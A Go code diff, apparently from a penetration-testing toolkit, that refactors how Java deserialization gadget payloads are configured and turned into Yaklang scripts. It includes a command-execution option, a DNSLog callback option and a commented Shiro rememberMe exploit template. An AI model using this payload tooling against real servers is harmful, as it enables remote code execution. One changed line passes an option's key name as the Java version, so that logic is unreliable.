@@ -139,7 +139,7 @@ func (s *Server) GetAllYsoClassOptions(ctx context.Context, req *ypb.YsoOptionsR
 }
 func (s *Server) GetAllYsoClassGeneraterOptions(ctx context.Context, req *ypb.YsoOptionsRequerstWithVerbose) (*ypb.YsoClassOptionsResponseWithVerbose, error) {
 	versionOptions := []*ypb.YsoClassGeneraterOptionsWithVerbose{
-		{Key: string(JavaClassGeneraterOption_Version), Value: "52", Type: string(StringPort), KeyVerbose: "Java 版本", Help: "当前 Class 使用的Java 版本"},
+		{Key: string(JavaClassGeneraterOption_Version), Value: "52", Type: string(StringPort), KeyVerbose: "Java 版本", Help: "Class 使用的Java 版本"},
 	}
 	commonOptions := []*ypb.YsoClassGeneraterOptionsWithVerbose{
 		{Key: string(JavaClassGeneraterOption_IsConstructer), Value: "false", Type: string(StringBool), KeyVerbose: "构造方法", Help: "开启则使用构造函数，否则使用静态代码块触发恶意代码"},
@@ -211,10 +211,9 @@ func (s *Server) GetAllYsoClassGeneraterOptions(ctx context.Context, req *ypb.Ys
 		}
 	} else {
 		if JavaBytesCodeType(req.Class) == JavaBytesCodeType_RuntimeExec {
-			versionOptions = append(versionOptions, &ypb.YsoClassGeneraterOptionsWithVerbose{
-				Key: string(JavaClassGeneraterOption_Command), Value: "", Type: string(String), KeyVerbose: "命令", Help: "命令",
-			})
-			return &ypb.YsoClassOptionsResponseWithVerbose{Options: versionOptions}, nil
+			return &ypb.YsoClassOptionsResponseWithVerbose{Options: []*ypb.YsoClassGeneraterOptionsWithVerbose{
+				{Key: string(JavaClassGeneraterOption_Command), Value: "", Type: string(String), KeyVerbose: "命令", Help: "命令"},
+			}}, nil
 		} else if JavaBytesCodeType(req.Class) == JavaBytesCodeType_DNSlog {
 			return &ypb.YsoClassOptionsResponseWithVerbose{Options: []*ypb.YsoClassGeneraterOptionsWithVerbose{
 				{Key: string(JavaClassGeneraterOption_Domain), Value: "", Type: string(String), KeyVerbose: "DNSLog域名", Help: "填入DNSLog地址"},
@@ -270,6 +269,10 @@ func optionsToYaklangCode(options []*ypb.YsoClassGeneraterOptionsWithVerbose, is
 					v = 0
 				}
 				preOptionsCode[option.Key] = v
+			} else {
+				preOptionsCode[option.Key] = option.Value
+				code := fmt.Sprintf("yso.%s(\"%s\")", "majorVersion", option.Value)
+				optionsCode = append(optionsCode, code)
 			}
 		case JavaClassGeneraterOption_Domain:
 			if isClass {
@@ -355,18 +358,18 @@ func generateYsoCode(req *ypb.YsoOptionsRequerstWithVerbose) (string, map[string
 	gadgetCodeTmp := `log.setLevel("info")
 gadgetObj,err = yso.$gadgetFun($options)
 if err {
-	log.error("%v",err)
+    log.error("%v",err)
 	return
 }
 gadgetBytes,err = yso.ToBytes(gadgetObj)
 if err {
-	log.error("%v",err)
-	return
+    log.error("%v",err)
+    return
 }
 
 // 16进制展示payload
 hexPayload = codec.EncodeToHex(gadgetBytes)    
-println(hexPayload)
+//(hexPayload)
 
 // // Shiro利用
 // target = "127.0.0.1:8080"
@@ -375,8 +378,7 @@ println(hexPayload)
 // payload = codec.PKCS5Padding(gadgetBytes, 16) // 加密payload
 // encodePayload = codec.AESCBCEncrypt(key, payload, nil)[0]
 // finalPayload = codec.EncodeBase64(append(key, encodePayload...))
-// rsp,req,err = poc.HTTP(` + "`" + `GET /login HTTP/1.1
-	//}
+// rsp,req,_ = poc.HTTP(` + "`" + `GET /login HTTP/1.1
 // Host: {{params(target)}}
 // Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
 // Accept-Encoding: gzip, deflate
@@ -555,8 +557,13 @@ if err != nil {
 	default:
 		return "", nil, utils.Error("not support class")
 	}
-	version := preOptionsCode[string(JavaClassGeneraterOption_Version)]
-	code = utils.Format(code, map[string]string{"version": fmt.Sprint(version)})
+	version := string(JavaClassGeneraterOption_Version)
+	if gadget != "" {
+		optionsCode = "yso.majorVersion(" + version + ")," + optionsCode
+		code = utils.Format(gadgetCodeTmp, map[string]string{"gadgetFun": gadget, "options": optionsCode})
+	} else {
+		code = utils.Format(code, map[string]string{"version": version})
+	}
 
 	if className != "" {
 		code = fmt.Sprintf("className = \"%s\"\n", className) + code
